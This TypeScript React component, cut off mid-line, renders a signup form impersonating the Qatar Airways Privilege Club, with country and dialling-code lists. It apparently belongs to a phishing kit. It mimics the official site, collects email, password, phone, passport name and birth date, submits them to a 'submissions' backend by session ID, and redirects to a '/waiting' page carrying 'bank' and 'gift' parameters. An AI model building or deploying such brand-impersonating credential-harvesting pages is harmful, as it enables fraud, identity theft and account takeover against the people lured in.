import { useState, useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";
import Header from "@/components/Header";
import { Eye, EyeOff } from "lucide-react";

// استيراد القوائم الكاملة والمفصلة بنسبة 100% كما في الموقع الرسمي
const TITLES = [
  {"text":"اللقب","value":""},
  {"text":"السيد","value":"MR"},
  {"text":"الآنسة","value":"MISS"},
  {"text":"الآنسة","value":"MS"},
  {"text":"السيدة","value":"MRS"},
  {"text":"سيد","value":"MSTR"},
  {"text":"الشيخة","value":"SHKA"},
  {"text":"الشيخ","value":"SHK"},
  {"text":"الدكتور","value":"DR"},
  {"text":"الأستاذ","value":"PROF"},
  {"text":"العميد","value":"BRIG"},
  {"text":"القائد","value":"CAPT"},
  {"text":"العقيد","value":"COL"},
  {"text":"اللواء","value":"GEN"},
  {"text":"الليدي","value":"LADY"},
  {"text":"الأمير","value":"PRIN"},
  {"text":"الأميرة","value":"PRCS"},
  {"text":"مدام","value":"MDM"},
  {"text":"لورد","value":"LORD"},
  {"text":"صاحب السعادة","value":"HE"},
  {"text":"الشريف/الشريفة","value":"HON"},
  {"text":"صاحب السمو الملكي","value":"HRHHIS"},
  {"text":"صاحبة السمو الملكي","value":"HRHHER"}
];

const COUNTRIES = [
  {"text":"دولة/قطاع الإقامة","value":""},{"text":"قطر","value":"QA"},{"text":"الإمارات العربيّة المتّحدة","value":"AE"},{"text":"المملكة العربية السعودية","value":"SA"},{"text":"الكويت","value":"KW"},{"text":"البحرين","value":"BH"},{"text":"سلطنة عمان","value":"OM"},{"text":"مصر","value":"EG"},{"text":"الأردن","value":"JO"},{"text":"لبنان","value":"LB"},{"text":"المغرب","value":"MA"},{"text":"الجزائر","value":"DZ"},{"text":"تونس","value":"TN"},{"text":"ليبيا","value":"LY"},{"text":"السودان","value":"SD"},{"text":"العراق","value":"IQ"},{"text":"اليمن","value":"YE"},{"text":"سوريا","value":"SY"},{"text":"فلسطين","value":"PS"},{"text":"المملكة المتحدة","value":"GB"},{"text":"الولايات المتحدة الأمريكية","value":"US"},{"text":"ألمانيا","value":"DE"},{"text":"فرنسا","value":"FR"},{"text":"تركيا","value":"TR"},{"text":"الهند","value":"IN"},{"text":"باكستان","value":"PK"},{"text":"أستراليا","value":"AU"},{"text":"كندا","value":"CA"},{"text":"اليابان","value":"JP"},{"text":"الصين","value":"CN"},{"text":"روسيا الاتحادية","value":"RU"},{"text":"إسبانيا","value":"ES"},{"text":"إيطاليا","value":"IT"},{"text":"هولندا","value":"NL"},{"text":"سويسرا","value":"CH"},{"text":"السويد","value":"SE"},{"text":"النرويج","value":"NO"},{"text":"النمسا","value":"AT"},{"text":"بلجيكا","value":"BE"},{"text":"البرازيل","value":"BR"},{"text":"الأرجنتين","value":"AR"},{"text":"المكسيك","value":"MX"},{"text":"ماليزيا","value":"MY"},{"text":"سنغافورة","value":"SG"},{"text":"تايلندا","value":"TH"},{"text":"أندونيسيا","value":"ID"},{"text":"الفليبين","value":"PH"},{"text":"فيتنام","value":"VN"},{"text":"كوريا الجنوبية","value":"KR"},{"text":"جنوب أفريقيا","value":"ZA"},{"text":"نيجيريا","value":"NG"},{"text":"كينيا","value":"KE"},{"text":"إثيوبيا","value":"ET"},{"text":"أذربيجان","value":"AZ"},{"text":"أرمينيا","value":"AM"},{"text":"أروبا","value":"AW"},{"text":"أفغانستان","value":"AF"},{"text":"ألبانيا","value":"AL"},{"text":"أنتيغوا وبربودا","value":"AG"},{"text":"أندورا","value":"AD"},{"text":"أنغولا","value":"AO"},{"text":"أورغواي","value":"UY"},{"text":"أوزباكستان","value":"UZ"},{"text":"أوغندا","value":"UG"},{"text":"أوكرانيا","value":"UA"},{"text":"إريتريا","value":"ER"},{"text":"إسرائيل","value":"IL"},{"text":"إلسلفادور","value":"SV"},{"text":"إيران","value":"IR"},{"text":"إيرلندا","value":"IE"},{"text":"استونيا","value":"EE"},{"text":"الإكوادور","value":"EC"},{"text":"البوسنا والهرسك","value":"BA"},{"text":"الجبل الأسود","value":"ME"},{"text":"الجمهورية السلوفاكية","value":"SK"},{"text":"الدانمارك","value":"DK"},{"text":"السنغال","value":"SN"},{"text":"الصومال","value":"SO"},{"text":"الغابون","value":"GA"},{"text":"الفاتيكان","value":"VA"},{"text":"الكاميرون","value":"CM"},{"text":"المجر","value":"HU"},{"text":"النيجر","value":"NE"},{"text":"بابوا غينيا الجديدة","value":"PG"},{"text":"باراغواي","value":"PY"},{"text":"بالاو","value":"PW"},{"text":"باهاماس","value":"BS"},{"text":"بربادوس","value":"BB"},{"text":"بروناي","value":"BN"},{"text":"بلغاريا","value":"BG"},{"text":"بليز","value":"BZ"},{"text":"بنغلاديش","value":"BD"},{"text":"بنما","value":"PA"},{"text":"بنين","value":"BJ"},{"text":"بوتان","value":"BT"},{"text":"بوتسوانا","value":"BW"},{"text":"بورتو ريكو","value":"PR"},{"text":"بوركينا فاسو","value":"BF"},{"text":"بوروندي","value":"BI"},{"text":"بولندا","value":"PL"},{"text":"بوليفيا","value":"BO"},{"text":"بولينيزيا الفرنسية","value":"PF"},{"text":"بيرو","value":"PE"},{"text":"تايوان, الصين","value":"TW"},{"text":"تركس وكايكوس","value":"TC"},{"text":"تركمانستان","value":"TM"},{"text":"ترينيداد وتوباغو","value":"TT"},{"text":"تشاد","value":"TD"},{"text":"تنزانيا","value":"TZ"},{"text":"توغو","value":"TG"},{"text":"توفالو","value":"TV"},{"text":"تونغا","value":"TO"},{"text":"تيمور ليست","value":"TL"},{"text":"جبل طارق","value":"GI"},{"text":"جرينلاند","value":"GL"},{"text":"جزر أنغويلا ليوارد","value":"AI"},{"text":"جزر الرأس الأخضر","value":"CV"},{"text":"جزر القمر","value":"KM"},{"text":"جزر الكريماس","value":"CX"},{"text":"جزر المالديف","value":"MV"},{"text":"جزر برمودا","value":"BM"},{"text":"جزر جوادلوب","value":"GP"},{"text":"جزر سليمان","value":"SB"},{"text":"جزر فارو","value":"FO"},{"text":"جزر فوكلاند","value":"FK"},{"text":"جزر فيرجن الأمريكية","value":"VI"},{"text":"جزر فيرجين البريطانية","value":"VG"},{"text":"جزر كايمان","value":"KY"},{"text":"جزر كوك","value":"CK"},{"text":"جزر كوكوس","value":"CC"},{"text":"جزر مارشال","value":"MH"},{"text":"جزر ماريانا الشمالية","value":"MP"},{"text":"جزيرة نورفولك","value":"NF"},{"text":"جمايكا","value":"JM"},{"text":"جمهورية أفريقيا الوسطى","value":"CF"},{"text":"جمهورية التشيكية","value":"CZ"},{"text":"جمهورية الدومينيكان","value":"DO"},{"text":"جمهورية الكونغو","value":"CG"},{"text":"جمهورية الكونغو الديمقراطية","value":"CD"},{"text":"جمهورية صربيا","value":"RS"},{"text":"جنوب السودان","value":"SS"},{"text":"جوام","value":"GU"},{"text":"جيبوتي","value":"DJ"},{"text":"جيورجيا","value":"GE"},{"text":"خراساو","value":"CW"},{"text":"دومينيكا","value":"DM"},{"text":"رواندا","value":"RW"},{"text":"روسيا البيضاء","value":"BY"},{"text":"رومانيا","value":"RO"},{"text":"ريونيون","value":"RE"},{"text":"ساحل العاج","value":"CI"},{"text":"ساموا","value":"WS"},{"text":"ساموا الأمريكية","value":"AS"},{"text":"سان تومي وبرينسيبي","value":"ST"},{"text":"سان مارينو","value":"SM"},{"text":"سانت بيير وميكلون","value":"PM"},{"text":"سانت فنسنت وغرينادين","value":"VC"},{"text":"سانت كيتس ونيفس","value":"KN"},{"text":"سانت لوسيا","value":"LC"},{"text":"سانت مارتن","value":"SX"},{"text":"سانت هيلينا","value":"SH"},{"text":"سريلانكا","value":"LK"},{"text":"سلوفينيا","value":"SI"},{"text":"سوازيلند","value":"SZ"},{"text":"سورينام","value":"SR"},{"text":"سيراليون","value":"SL"},{"text":"سيشيل","value":"SC"},{"text":"شيلي","value":"CL"},{"text":"طاجيكستان","value":"TJ"},{"text":"غامبيا","value":"GM"},{"text":"غانا","value":"GH"},{"text":"غرينادا","value":"GD"},{"text":"غواتيمال","value":"GT"},{"text":"غويانا الفرنسية","value":"GF"},{"text":"غيانا","value":"GY"},{"text":"غينيا","value":"GN"},{"text":"غينيا - بيساو","value":"GW"},{"text":"غينيا الاستوائية","value":"GQ"},{"text":"فانواتو","value":"VU"},{"text":"فنزويلا","value":"VE"},{"text":"فنلندا","value":"FI"},{"text":"فيجي","value":"FJ"},{"text":"قبرص","value":"CY"},{"text":"قيرغيزستان","value":"KG"},{"text":"كازاخستان","value":"KZ"},{"text":"كاليدونيا الجديدة","value":"NC"},{"text":"كرواتيا","value":"HR"},{"text":"كمبوديا","value":"KH"},{"text":"كوبا","value":"CU"},{"text":"كوريا الشمالية","value":"KP"},{"text":"كوستاريكا","value":"CR"},{"text":"كولومبيا","value":"CO"},{"text":"كيريباتي","value":"KI"},{"text":"لاتفيا","value":"LV"},{"text":"لاوس","value":"LA"},{"text":"لوكسمبورغ","value":"LU"},{"text":"ليبيريا","value":"LR"},{"text":"ليتوانيا","value":"LT"},{"text":"ليختنشتين","value":"LI"},{"text":"ليسوتو","value":"LS"},{"text":"مارتينيك","value":"MQ"},{"text":"مالاوي","value":"MW"},{"text":"مالطا","value":"MT"},{"text":"مالي","value":"ML"},{"text":"مايكرونيزيا","value":"FM"},{"text":"مقدونيا الشمالية","value":"MK"},{"text":"منغوليا","value":"MN"},{"text":"موريتانيا","value":"MR"},{"text":"موريشيوس","value":"MU"},{"text":"موزمبيق","value":"MZ"},{"text":"مولدافيا","value":"MD"},{"text":"موناكو","value":"MC"},{"text":"مونتسيرات","value":"MS"},{"text":"ميانمار","value":"MM"},{"text":"ناميبيا","value":"NA"},{"text":"نورو","value":"NR"},{"text":"نيبال","value":"NP"},{"text":"نيكاراجوا","value":"NI"},{"text":"نيوزيلندا","value":"NZ"},{"text":"نيوى","value":"NU"},{"text":"هايتي","value":"HT"},{"text":"هندوراس","value":"HN"},{"text":"هونغ كونغ، الصين","value":"HK"}
];

const COUNTRY_CODES = [
  {"text":"رمز البلد الهاتفي","value":""},{"text":"قطر (974)","value":"974-QA"},{"text":"الإمارات العربيّة المتّحدة (971)","value":"971-AE"},{"text":"المملكة العربية السعودية (966)","value":"966-SA"},{"text":"الكويت (965)","value":"965-KW"},{"text":"البحرين (973)","value":"973-BH"},{"text":"سلطنة عمان (968)","value":"968-OM"},{"text":"مصر (20)","value":"20-EG"},{"text":"الأردن (962)","value":"962-JO"},{"text":"لبنان (961)","value":"961-LB"},{"text":"المغرب (212)","value":"212-MA"},{"text":"الجزائر (213)","value":"213-DZ"},{"text":"تونس (216)","value":"216-TN"},{"text":"ليبيا (218)","value":"218-LY"},{"text":"السودان (249)","value":"249-SD"},{"text":"العراق (964)","value":"964-IQ"},{"text":"اليمن (967)","value":"967-YE"},{"text":"سوريا (963)","value":"963-SY"},{"text":"فلسطين (970)","value":"970-PS"},{"text":"المملكة المتحدة (44)","value":"44-GB"},{"text":"الولايات المتحدة الأمريكية (1)","value":"1-US"},{"text":"ألمانيا (49)","value":"49-DE"},{"text":"فرنسا (33)","value":"33-FR"},{"text":"تركيا (90)","value":"90-TR"},{"text":"الهند (91)","value":"91-IN"},{"text":"باكستان (92)","value":"92-PK"},{"text":"أستراليا (61)","value":"61-AU"},{"text":"كندا (1)","value":"1-CA"},{"text":"اليابان (81)","value":"81-JP"},{"text":"الصين (86)","value":"86-CN"},{"text":"روسيا (7)","value":"7-RU"},{"text":"إسبانيا (34)","value":"34-ES"},{"text":"إيطاليا (39)","value":"39-IT"},{"text":"هولندا (31)","value":"31-NL"},{"text":"سويسرا (41)","value":"41-CH"},{"text":"السويد (46)","value":"46-SE"},{"text":"النرويج (47)","value":"47-NO"},{"text":"النمسا (43)","value":"43-AT"},{"text":"بلجيكا (32)","value":"32-BE"},{"text":"البرازيل (55)","value":"55-BR"},{"text":"الأرجنتين (54)","value":"54-AR"},{"text":"المكسيك (52)","value":"52-MX"},{"text":"ماليزيا (60)","value":"60-MY"},{"text":"سنغافورة (65)","value":"65-SG"},{"text":"تايلندا (66)","value":"66-TH"},{"text":"أندونيسيا (62)","value":"62-ID"},{"text":"الفليبين (63)","value":"63-PH"},{"text":"فيتنام (84)","value":"84-VN"},{"text":"كوريا الجنوبية (82)","value":"82-KR"},{"text":"جنوب أفريقيا (27)","value":"27-ZA"},{"text":"نيجيريا (234)","value":"234-NG"},{"text":"كينيا (254)","value":"254-KE"},{"text":"إثيوبيا (251)","value":"251-ET"},{"text":"أذربيجان (994)","value":"994-AZ"},{"text":"أرمينيا (374)","value":"374-AM"},{"text":"أروبا (297)","value":"297-AW"},{"text":"أفغانستان (93)","value":"93-AF"},{"text":"ألبانيا (355)","value":"355-AL"},{"text":"أنتيغوا وبربودا (1)","value":"1-AG"},{"text":"أندورا (376)","value":"376-AD"},{"text":"أنغولا (244)","value":"244-AO"},{"text":"أورغواي (598)","value":"598-UY"},{"text":"أوزباكستان (998)","value":"998-UZ"},{"text":"أوغندا (256)","value":"256-UG"},{"text":"أوكرانيا (380)","value":"380-UA"},{"text":"إريتريا (291)","value":"291-ER"},{"text":"إسرائيل (972)","value":"972-IL"},{"text":"إلسلفادور (503)","value":"503-SV"},{"text":"إيران (98)","value":"98-IR"},{"text":"إيرلندا (353)","value":"353-IE"},{"text":"استونيا (372)","value":"372-EE"},{"text":"الإكوادور (593)","value":"593-EC"},{"text":"البوسنا والهرسك (387)","value":"387-BA"},{"text":"الجبل الأسود (382)","value":"382-ME"},{"text":"الجمهورية السلوفاكية (421)","value":"421-SK"},{"text":"الدانمارك (45)","value":"45-DK"},{"text":"السنغال (221)","value":"221-SN"},{"text":"الصومال (252)","value":"252-SO"},{"text":"الغابون (241)","value":"241-GA"},{"text":"الفاتيكان (39)","value":"39-VA"},{"text":"الكاميرون (237)","value":"237-CM"},{"text":"المجر (36)","value":"36-HU"},{"text":"النيجر (227)","value":"227-NE"},{"text":"بابوا غينيا الجديدة (675)","value":"675-PG"},{"text":"باراغواي (595)","value":"595-PY"},{"text":"بالاو (680)","value":"680-PW"},{"text":"باهاماس (242)","value":"242-BS"},{"text":"بربادوس (1)","value":"1-BB"},{"text":"بروناي (673)","value":"673-BN"},{"text":"بلغاريا (359)","value":"359-BG"},{"text":"بليز (501)","value":"501-BZ"},{"text":"بنغلاديش (880)","value":"880-BD"},{"text":"بنما (507)","value":"507-PA"},{"text":"بنين (229)","value":"229-BJ"},{"text":"بوتان (975)","value":"975-BT"},{"text":"بوتسوانا (267)","value":"267-BW"},{"text":"بورتو ريكو (1)","value":"1-PR"},{"text":"بوركينا فاسو (226)","value":"226-BF"},{"text":"بوروندي (257)","value":"257-BI"},{"text":"بولندا (48)","value":"48-PL"},{"text":"بوليفيا (591)","value":"591-BO"},{"text":"بولينيزيا الفرنسية (689)","value":"689-PF"},{"text":"بيرو (51)","value":"51-PE"},{"text":"تايوان, الصين (886)","value":"886-TW"},{"text":"تركس وكايكوس (1)","value":"1-TC"},{"text":"تركمانستان (993)","value":"993-TM"},{"text":"ترينيداد وتوباغو (1)","value":"1-TT"},{"text":"تشاد (235)","value":"235-TD"},{"text":"تنزانيا (255)","value":"255-TZ"},{"text":"توغو (228)","value":"228-TG"},{"text":"توفالو (688)","value":"688-TV"},{"text":"تونغا (676)","value":"676-TO"},{"text":"تيمور ليست (670)","value":"670-TL"},{"text":"جبل طارق (350)","value":"350-GI"},{"text":"جرينلاند (299)","value":"299-GL"},{"text":"جزر أنغويلا ليوارد (1)","value":"1-AI"},{"text":"جزر الرأس الأخضر (238)","value":"238-CV"},{"text":"جزر القمر (269)","value":"269-KM"},{"text":"جزر الكريماس (672)","value":"672-CX"},{"text":"جزر المالديف (960)","value":"960-MV"},{"text":"جزر برمودا (1441)","value":"1441-BM"},{"text":"جزر جوادلوب (590)","value":"590-GP"},{"text":"جزر سليمان (677)","value":"677-SB"},{"text":"جزر فارو (298)","value":"298-FO"},{"text":"جزر فوكلاند (500)","value":"500-FK"},{"text":"جزر فيرجن الأمريكية (1)","value":"1-VI"},{"text":"جزر فيرجين البريطانية (1)","value":"1-VG"},{"text":"جزر كايمان (1)","value":"1-KY"},{"text":"جزر كوك (682)","value":"682-CK"},{"text":"جزر كوكوس (672)","value":"672-CC"},{"text":"جزر مارشال (692)","value":"692-MH"},{"text":"جزر ماريانا الشمالية (1)","value":"1-MP"},{"text":"جزيرة نورفولك (672)","value":"672-NF"},{"text":"جمايكا (1)","value":"1-JM"},{"text":"جمهورية أفريقيا الوسطى (236)","value":"236-CF"},{"text":"جمهورية التشيكية (420)","value":"420-CZ"},{"text":"جمهورية الدومينيكان (1)","value":"1-DO"},{"text":"جمهورية الكونغو (242)","value":"242-CG"},{"text":"جمهورية الكونغو الديمقراطية (243)","value":"243-CD"},{"text":"جمهورية صربيا (381)","value":"381-RS"},{"text":"جنوب السودان (211)","value":"211-SS"},{"text":"جوام (1)","value":"1-GU"},{"text":"جيبوتي (253)","value":"253-DJ"},{"text":"جيورجيا (995)","value":"995-GE"},{"text":"خراساو (599)","value":"599-CW"},{"text":"دومينيكا (1)","value":"1-DM"},{"text":"رواندا (250)","value":"250-RW"},{"text":"روسيا البيضاء (375)","value":"375-BY"},{"text":"رومانيا (40)","value":"40-RO"},{"text":"ريونيون (262)","value":"262-RE"},{"text":"ساحل العاج (225)","value":"225-CI"},{"text":"ساموا (685)","value":"685-WS"},{"text":"ساموا الأمريكية (1)","value":"1-AS"},{"text":"سان تومي وبرينسيبي (239)","value":"239-ST"},{"text":"سان مارينو (378)","value":"378-SM"},{"text":"سانت بيير وميكلون (508)","value":"508-PM"},{"text":"سانت فنسنت وغرينادين (1)","value":"1-VC"},{"text":"سانت كيتس ونيفس (1)","value":"1-KN"},{"text":"سانت لوسيا (1)","value":"1-LC"},{"text":"سانت مارتن (1)","value":"1-SX"},{"text":"سانت هيلينا (290)","value":"290-SH"},{"text":"سريلانكا (94)","value":"94-LK"},{"text":"سلوفينيا (386)","value":"386-SI"},{"text":"سوازيلند (268)","value":"268-SZ"},{"text":"سورينام (597)","value":"597-SR"},{"text":"سيراليون (232)","value":"232-SL"},{"text":"سيشيل (248)","value":"248-SC"},{"text":"شيلي (56)","value":"56-CL"},{"text":"طاجيكستان (992)","value":"992-TJ"},{"text":"غامبيا (220)","value":"220-GM"},{"text":"غانا (233)","value":"233-GH"},{"text":"غرينادا (1)","value":"1-GD"},{"text":"غواتيمال (502)","value":"502-GT"},{"text":"غويانا الفرنسية (594)","value":"594-GF"},{"text":"غيانا (592)","value":"592-GY"},{"text":"غينيا (224)","value":"224-GN"},{"text":"غينيا - بيساو (245)","value":"245-GW"},{"text":"غينيا الاستوائية (240)","value":"240-GQ"},{"text":"فانواتو (678)","value":"678-VU"},{"text":"فنزويلا (58)","value":"58-VE"},{"text":"فنلندا (358)","value":"358-FI"},{"text":"فيجي (679)","value":"679-FJ"},{"text":"قبرص (357)","value":"357-CY"},{"text":"قيرغيزستان (996)","value":"996-KG"},{"text":"كازاخستان (7)","value":"7-KZ"},{"text":"كاليدونيا الجديدة (687)","value":"687-NC"},{"text":"كرواتيا (385)","value":"385-HR"},{"text":"كمبوديا (855)","value":"855-KH"},{"text":"كوبا (53)","value":"53-CU"},{"text":"كوريا الشمالية (850)","value":"850-KP"},{"text":"كوستاريكا (506)","value":"506-CR"},{"text":"كولومبيا (57)","value":"57-CO"},{"text":"كيريباتي (686)","value":"686-KI"},{"text":"لاتفيا (371)","value":"371-LV"},{"text":"لاوس (856)","value":"856-LA"},{"text":"لوكسمبورغ (352)","value":"352-LU"},{"text":"ليبيريا (231)","value":"231-LR"},{"text":"ليتوانيا (370)","value":"370-LT"},{"text":"ليختنشتين (423)","value":"423-LI"},{"text":"ليسوتو (266)","value":"266-LS"},{"text":"مارتينيك (596)","value":"596-MQ"},{"text":"مالاوي (265)","value":"265-MW"},{"text":"مالطا (356)","value":"356-MT"},{"text":"مالي (223)","value":"223-ML"},{"text":"مايكرونيزيا (691)","value":"691-FM"},{"text":"مقدونيا الشمالية (389)","value":"389-MK"},{"text":"منغوليا (976)","value":"976-MN"},{"text":"موريتانيا (222)","value":"222-MR"},{"text":"موريشيوس (230)","value":"230-MU"},{"text":"موزمبيق (258)","value":"258-MZ"},{"text":"مولدافيا (373)","value":"373-MD"},{"text":"موناكو (377)","value":"377-MC"},{"text":"مونتسيرات (1)","value":"1-MS"},{"text":"ميانمار (95)","value":"95-MM"},{"text":"ناميبيا (264)","value":"264-NA"},{"text":"نورو (674)","value":"674-NR"},{"text":"نيبال (977)","value":"977-NP"},{"text":"نيكاراجوا (505)","value":"505-NI"},{"text":"نيوزيلندا (64)","value":"64-NZ"},{"text":"نيوى (683)","value":"683-NU"},{"text":"هايتي (509)","value":"509-HT"},{"text":"هندوراس (504)","value":"504-HN"},{"text":"هونغ كونغ، الصين (852)","value":"852-HK"}
];

export default function PersonalData() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const { language } = useLanguage();
  const params = new URLSearchParams(search);
  const bank = params.get("bank") || "doha";
  const sessionId = localStorage.getItem("sessionId") || "";

  const isArabic = language === "ar";
  
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({
    email: "",
    password: "",
    confirmPassword: "",
    countryCode: "974-QA",
    phoneNumber: "",
    title: "",
    nameEnglish: "",
    middleName: "",
    lastName: "",
    dateOfBirth: "",
    gender: "",
    country: "QA",
    promoCode: "",
  });

  const submitPersonalDataMutation = trpc.submissions.submitPersonalData.useMutation();

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const currentSessionId = sessionId || params.get("session") || localStorage.getItem("sessionId") || "";
    
    if (!currentSessionId) {
      toast.error(isArabic ? "جلسة غير صالحة" : "Invalid session");
      return;
    }

    if (formData.password !== formData.confirmPassword) {
      toast.error(isArabic ? "كلمات المرور غير متطابقة" : "Passwords do not match");
      return;
    }

    try {
      await submitPersonalDataMutation.mutateAsync({
        sessionId: currentSessionId,
        email: formData.email,
        password: formData.password,
        phoneNumber: `${formData.countryCode.split('-')[0]}${formData.phoneNumber}`,
        title: formData.title,
        nameEnglish: formData.nameEnglish,
        middleName: formData.middleName,
        lastName: formData.lastName,
        dateOfBirth: formData.dateOfBirth,
        gender: formData.gender,
        country: formData.country,
        promoCode: formData.promoCode,
        nameArabic: "",
        idNumber: "",
      });
      
      toast.success(isArabic ? "تم حفظ البيانات بنجاح" : "Data saved successfully");
      const giftId = params.get("gift") || "";
      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}${giftId ? `&gift=${giftId}` : ''}`);
    } catch (error) {
      console.error("Error saving personal data:", error);
      toast.error(isArabic ? "فشل حفظ البيانات، يرجى المحاولة مرة أخرى" : "Failed to save data, please try again");
    }
  };

  useEffect(() => {
    document.title = isArabic ? "إنشاء حساب | الخطوط الجوية القطرية" : "Join Now | Qatar Airways";
  }, [isArabic]);

  return (
    <div className="page-wrapper min-h-screen bg-white" dir={isArabic ? "rtl" : "ltr"}>
      <style>{`
        .page-wrapper { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #333; }
        .main-container { max-width: 600px; margin: 0 auto; padding: 40px 20px; }
        
        .form-title { font-size: 32px; font-weight: bold; color: #5c0931; margin-bottom: 40px; text-align: center; line-height: 1.3; }
        .section-header { font-size: 18px; font-weight: bold; color: #333; margin: 30px 0 15px; }
        
        .input-group { margin-bottom: 20px; }
        .input-wrapper { position: relative; }
        .form-input { width: 100%; padding: 14px 16px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; transition: border-color 0.2s; background: #fff; box-sizing: border-box; }
        .form-input:focus { border-color: #5c0931; outline: none; }
        
        .password-hint { font-size: 12px; color: #777; margin-top: 8px; line-height: 1.5; }
        .password-toggle { position: absolute; ${isArabic ? 'left' : 'right'}: 12px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #5c0931; }

        .radio-group { display: flex; gap: 30px; margin-top: 10px; }
        .radio-item { display: flex; align-items: center; gap: 8px; cursor: pointer; font-size: 16px; }
        .radio-item input { width: 20px; height: 20px; accent-color: #5c0931; }

        .checkbox-section { margin-top: 30px; }
        .checkbox-item { display: flex; gap: 12px; margin-bottom: 20px; font-size: 14px; color: #555; line-height: 1.6; }
        .checkbox-item input { width: 20px; height: 20px; flex-shrink: 0; accent-color: #5c0931; }
        .checkbox-item a { color: #5c0931; text-decoration: underline; }

        .submit-btn { background: #5c0931; color: white; width: 100%; padding: 18px; border-radius: 4px; font-weight: bold; font-size: 18px; margin-top: 20px; cursor: pointer; transition: opacity 0.2s; border: none; }
        .submit-btn:hover { opacity: 0.9; }
        
        .helper-text { font-size: 12px; color: #888; margin-top: 5px; }
      `}</style>

      <Header />

      <div className="main-container">
        <h2 className="form-title">{isArabic ? "يمكنك إنشاء حساب خلال دقيقة واحدة فقط" : "You can create an account in just one minute"}</h2>

        <form onSubmit={handleSubmit}>
          <div className="section-header">{isArabic ? "دعنا ننشئ بيانات الاعتماد الخاصة بك." : "Let's create your credentials."}</div>
          
          <div className="input-group">
            <input type="email" name="email" className="form-input" placeholder={isArabic ? "عنوان البريد الإلكتروني" : "Email Address"} value={formData.email} onChange={handleChange} required />
          </div>

          <div className="input-group">
            <div className="input-wrapper">
              <input type={showPassword ? "text" : "password"} name="password" className="form-input" placeholder={isArabic ? "ادخل كلمة مرور" : "Enter Password"} value={formData.password} onChange={handleChange} required />
              <div className="password-toggle" onClick={() => setShowPassword(!showPassword)}>
                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </div>
            </div>
            <p className="password-hint">
              {isArabic 
                ? "يجب أن تتكون من 8 رموز على الأقل، منها رقم واحد وحرف كبير وحرف صغير ورمز خاص (!@#$%?&*)."
                : "Must be at least 8 characters, including a number, uppercase, lowercase, and a special character (!@#$%?&*)."}
            </p>
          </div>

          <div className="input-group">
            <input type={showPassword ? "text" : "password"} name="confirmPassword" className="form-input" placeholder={isArabic ? "إعادة إدخال كلمة المرور" : "Re-enter Password"} value={formData.confirmPassword} onChange={handleChange} required />
          </div>

          <div className="input-group">
            <select name="countryCode" className="form-input bg-[#f8f9fb]" value={formData.countryCode} onChange={handleChange} required>
              {COUNTRY_CODES.map(c => <option key={c.value} value={c.value}>{c.text}</option>)}
            </select>
          </div>

          <div className="input-group">
            <input type="tel" name="phoneNumber" className="form-input" placeholder={isArabic ? "رقم الجوال" : "Mobile Number"} value={formData.phoneNumber} onChange={handleChange} required />
          </div>

          <div className="section-header">{isArabic ? "بياناتك الشخصية" : "Your Personal Details"}</div>

          <div className="input-group">
            <select name="title" className="form-input bg-[#f8f9fb]" value={formData.title} onChange={handleChange} required>
              {TITLES.map(t => <option key={`${t.value}-${t.text}`} value={t.value}>{t.text}</option>)}
            </select>
          </div>

          <div className="input-group">
            <input type="text" name="nameEnglish" className="form-input" placeholder={isArabic ? "الاسم الأول باللغة الإنجليزية (كما في جواز السفر)" : "First Name (as in Passport)"} value={formData.nameEnglish} onChange={handleChange} required />
          </div>

          <div className="input-group">
            <input type="text" name="middleName" className="form-input" placeholder={isArabic ? "الاسم الأوسط باللغة الإنجليزية (اختياري)" : "Middle Name (Optional)"} value={formData.middleName} onChange={handleChange} />
          </div>

          <div className="input-group">
            <input type="text" name="lastName" className="form-input" placeholder={isArabic ? "الاسم الأخير باللغة الإنجليزية (كما في جواز السفر)" : "Last Name (as in Passport)"} value={formData.lastName} onChange={handleChange} required />
            <p className="helper-text">{isArabic ? "يجب إدخال اسمك باللغة الإنجليزية كما يظهر في جواز سفرك." : "Your name must be entered in English as it appears on your passport."}</p>
          </div>

          <div className="input-group">
            <label className="input-label">{isArabic ? "تاريخ الميلاد" : "Date of Birth"}</label>
            <input type="text" name="dateOfBirth" placeholder="DD/MM/YYYY" className="form-input" value={formData.dateOfBirth} onChange={handleChange} required />
          </div>

          <div className="input-group">
            <label className="input-label">{isArabic ? "النوع (اختياري)" : "Gender (Optional)"}</label>
            <div className="radio-group">
              <label className="radio-item">
                <input type="radio" name="gender" value="male" checked={formData.gender === 'male'} onChange={handleChange} />
                {isArabic ? "ذكر" : "Male"}
              </label>
              <label className="radio-item">
                <input type="radio" name="gender" value="female" checked={formData.gender === 'female'} onChange={handleChange} />
                {isArabic ? "أنثى" : "Female"}
              </label>
            </div>
          </div>

          <div className="section-header">{isArabic ? "أين تقيم؟" : "Where do you reside?"}</div>
          
          <div className="input-group">
            <select name="country" className="form-input bg-[#f8f9fb]" value={formData.country} onChange={handleChange} required>
              {COUNTRIES.map(c => <option key={c.value} value={c.value}>{c.text}</option>)}
            </select>
          </div>

          <div className="section-header">{isArabic ? "الرمز الترويجي لتسجيل الانضمام" : "Enrolment Promo Code"}</div>
          
          <div className="input-group">
            <input type="text" name="promoCode" className="form-input" placeholder={isArabic ? "الرمز الترويجي (اختياري)" : "Promo Code (Optional)"} value={formData.promoCode} onChange={handleChange} />
          </div>

          <div className="checkbox-section">
            <div className="checkbox-item">
              <input type="checkbox" id="partners" />
              <label htmlFor="partners">{isArabic ? "أرغب في تلقي الأخبار والعروض من شركاء نادي الامتياز" : "I would like to receive news and offers from Privilege Club partners"}</label>
            </div>
            <div className="checkbox-item">
              <input type="checkbox" id="qatar_group" />
              <label htmlFor="qatar_group">
                {isArabic ? "أرغب في تلقي الأخبار والعروض من شركات أخرى في مجموعة الخطوط الجوية القطرية" : "I would like to receive news and offers from other companies in Qatar Airways Group"}
              </label>
            </div>
            <div className="checkbox-item">
              <input type="checkbox" id="terms" required />
              <label htmlFor="terms">
                {isArabic 
